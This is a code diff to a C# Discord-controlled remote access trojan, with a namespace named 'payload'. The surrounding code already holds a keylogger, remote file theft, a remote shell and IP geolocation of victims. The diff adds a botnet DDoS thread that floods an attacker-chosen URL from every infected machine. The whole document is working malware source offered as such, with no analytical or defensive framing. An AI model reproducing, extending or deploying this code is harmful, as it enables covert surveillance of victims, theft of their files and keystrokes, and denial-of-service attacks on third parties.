@@ -13,6 +13,7 @@ using System.Windows.Forms;
 using Discord;
 using Discord.WebSocket;
 using Newtonsoft.Json;
+using System.Net.Http;
 using System.Globalization;
 
 namespace payload
@@ -29,6 +30,8 @@ namespace payload
         private static string prefix;
         private static string keylog = string.Empty;
         private static bool logkeys = false;
+        private static bool ddos = false;
+        private static string toddos = string.Empty;
 
         private static List<string> geolock = new List<string>();
 
@@ -50,6 +53,7 @@ namespace payload
             SetProcessDPIAware();
             try { Process.EnterDebugMode(); } catch { }
             new Thread(new ThreadStart(KeylogThread)).Start();
+            new Thread(new ThreadStart(DdosThread)).Start();
 
             client = new DiscordSocketClient();
             client.MessageReceived += MessageReceived;
@@ -113,13 +117,13 @@ namespace payload
                     }
                 case "getfile":
                     {
-                        if (args[0].Trim() != Environment.MachineName) break;
+                        if (args[0] != Environment.MachineName) break;
                         await message.Channel.SendFileAsync(args[1]);
                         break;
                     }
                 case "shell":
                     {
-                        if (args[0].Trim() != Environment.MachineName) break;
+                        if (args[0] != Environment.MachineName) break;
                         Shell s = new Shell(await message.Channel.SendMessageAsync("``` ```"));
                         shells.Add(s);
                         s.Start();
@@ -127,17 +131,17 @@ namespace payload
                     }
                 case "ipinfo":
                     {
+                        if (args[0] != Environment.MachineName) break;
                         WebClient wc = new WebClient();
                         string address = wc.DownloadString("https://api.ipify.org/?format=txt");
                         string location = JsonConvert.DeserializeObject<Dictionary<string, string>>(wc.DownloadString($"https://api.iplocation.net/?ip={address}"))["country_name"];
                         wc.Dispose();
-
                         await message.Channel.SendMessageAsync($"IP address: {address}\nLocation: {location}");
                         break;
                     }
                 case "getkeylog":
                     {
-                        if (args[0].Trim() != Environment.MachineName) break;
+                        if (args[0] != Environment.MachineName) break;
                         MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(keylog));
                         await message.Channel.SendFileAsync(ms, "unknown.txt");
                         ms.Dispose();
@@ -146,24 +150,48 @@ namespace payload
                     }
                 case "startkeylogger":
                     {
-                        if (args[0].Trim() != Environment.MachineName) break;
+                        if (args[0] != Environment.MachineName) break;
                         logkeys = true;
                         await message.Channel.SendMessageAsync($"Keylogger started on {Environment.MachineName}");
                         break;
                     }
                 case "stopkeylogger":
                     {
-                        if (args[0].Trim() != Environment.MachineName) break;
+                        if (args[0] != Environment.MachineName) break;
                         logkeys = false;
                         await message.Channel.SendMessageAsync($"Keylogger stopped on {Environment.MachineName}");
                         break;
                     }
+                case "startddos":
+                    {
+                        ddos = true;
+                        toddos = args[1];
+                        await message.Channel.SendMessageAsync($"DDOS started on all machines.");
+                        break;
+                    }
+                case "stopddos":
+                    {
+                        ddos = false;
+                        toddos = string.Empty;
+                        await message.Channel.SendMessageAsync($"DDOS stopped on all machines.");
+                        break;
+                    }
                 case "uninfect":
                     {
-                        if (args[0].Trim() != Environment.MachineName) break;
+                        if (args[0] != Environment.MachineName || !args[0].ToLower().Contains("all")) break;
                         Uninfect();
                         break;
                     }
+            }
+        }
+
+        private static void DdosThread()
+        {
+            HttpClient hc = new HttpClient();
+            while (true)
+            {
+                if (ddos) hc.GetAsync(toddos).GetAwaiter().GetResult();
+                Thread.Sleep(1000);
             }
         }
 
